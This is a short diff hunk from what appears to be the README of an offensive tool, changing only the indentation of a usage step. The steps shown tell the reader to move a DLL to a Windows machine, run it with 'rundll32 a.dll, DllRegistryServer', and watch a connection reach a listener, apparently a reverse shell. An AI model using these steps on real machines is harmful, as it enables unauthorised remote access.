@@ -24,6 +24,6 @@ Successfull execution of the above command will result two files named cipher.bi
 6. Transfer the dll to a windows machine.
 7. Open command prompt and run the following command.
 
-    ```rundll32 a.dll, DllRegistryServer```
+ ```rundll32 a.dll, DllRegistryServer```
 
 9. After a second, You will see the connection in your terminal where you started your listener.
